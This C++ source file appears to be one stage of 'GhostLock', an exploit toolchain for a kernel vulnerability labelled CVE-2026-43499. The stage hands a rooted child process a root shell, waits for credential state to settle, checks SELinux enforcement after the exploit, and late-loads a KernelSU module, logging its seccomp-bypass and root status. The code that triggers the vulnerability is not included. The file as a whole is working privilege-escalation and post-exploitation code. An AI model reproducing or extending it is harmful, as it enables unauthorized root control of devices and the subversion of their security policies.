#include "common.h"
/*
 * GhostLock — root_child terminal procedure (Batch 4, D1=B).
 *
 * The handoff step moved out of ExploitProcedure; the body is unchanged except
 * for using the CoreSession parameter instead of the procedure's member.
 */

#include "terminal/root_child.hpp"
#include "backend/cve_2026_43499_state.hpp"

#include "backend/cve_2026_43499/route/route_api.hpp"
#include "session/core_session.hpp"
#include "terminal/handoff_probe.hpp"

#include <unistd.h>

#include <cerrno>
#include <cstdint>

namespace ghostlock::terminal {
    using ghostlock::session::CoreSession;
    using ghostlock::session::StageResult;
    StageResult RootChildPolicy::run(CoreSession &session, ghostlock::terminal::RootedChild &child) {
        return run_root_child_handoff(session, child);
    }

    /* Stage: settle, root-shell handoff and KernelSU late-load. */
    StageResult run_root_child_handoff(CoreSession &session, ghostlock::terminal::RootedChild &child) {
        const int32_t child_alive = child.alive ? 1 : 0;
        const int32_t seccomp_ok = child.seccomp_bypassed ? 1 : 0;
        const int32_t ever_rooted = child.ever_rooted ? 1 : 0;
        const pid_t child_pid = child.pid;

        /* Let the repaired credential and reclaimed waiter state settle before the
         * rooted child reloads SELinux policy and late-loads KernelSU.  Dispatching
         * immediately regressed the proven 5.15 path: KernelSU loaded, then init
         * exited during policy recovery and the device panicked. */
        usleep(ghostlock::backend::cve43499_state(session::g_exploit_session).profile.handoff_pre_dispatch_settle_ms() * 1000U);
        support::timer_mark("exploit complete");
        if (!ever_rooted) {
            pr_error("w2 never rooted a child\n");
            return StageResult::Failed;
        }
        if (child_alive) {
            errno = 0;
            const ssize_t sent = write(child.command.get(), "G", 1);
            pr_info("handoff: child=%d alive=%d sent=%zd errno=%d\n", child_pid,
                    child_alive, sent, errno);
            if (sent != 1)
                pr_warning("failed to start root shell (child exited early)\n");
            child.command.reset();
            waitpid(child_pid, nullptr, WNOHANG);
        } else if (child_pid > 0) {
            if (write(child.command.get(), "G", 1) != 1)
                pr_warning("failed to start root shell (parked child exited)\n");
            child.command.reset();
            waitpid(child_pid, nullptr, WNOHANG);
        } else {
            pr_warning("skipping late-load: child died during W3\n");
        }
        child.uid_read.reset();

        HandoffPollPolicy handoff_policy;
        handoff_policy.module_poll_attempts =
                ghostlock::backend::cve43499_state(session::g_exploit_session).profile.handoff_module_poll_attempts();
        handoff_policy.module_poll_interval_ms =
                ghostlock::backend::cve43499_state(session::g_exploit_session).profile.handoff_module_poll_interval_ms();
        handoff_policy.enforce_poll_attempts =
                ghostlock::backend::cve43499_state(session::g_exploit_session).profile.handoff_enforce_poll_attempts();
        handoff_policy.enforce_poll_interval_ms =
                ghostlock::backend::cve43499_state(session::g_exploit_session).profile.handoff_enforce_poll_interval_ms();
        const HandoffProbeResult handoff_result =
                handoff_probe_run(handoff_policy, config::runtime_config_snapshot().ksu_log_path);
        if (handoff_result.enforce_ok)
            pr_info("enforce=1 (enforcing)\n");
        else if (handoff_result.ksu_log_loaded)
            pr_warning("enforce=0 (still permissive)\n");
        const int32_t kernelsu_ready = handoff_result.ready() ? 1 : 0;

        /* Fixup: permissive, load_policy, late-load. Module init re-enforces;
         * policy reload keeps it working after enforcing is back. */
        if (kernelsu_ready)
            pr_success("KernelSU ready\n");
        else if (handoff_result.ksu_log_failed)
            pr_warning("KernelSU module load failed\n");
        else if (seccomp_ok)
            pr_warning("temporary root ready; KernelSU module load pending\n");
        else
            pr_warning("temporary root ready; KernelSU module not loaded (W3 seccomp clear failed)\n");
        return StageResult::Done;
    }
} // namespace ghostlock::terminal
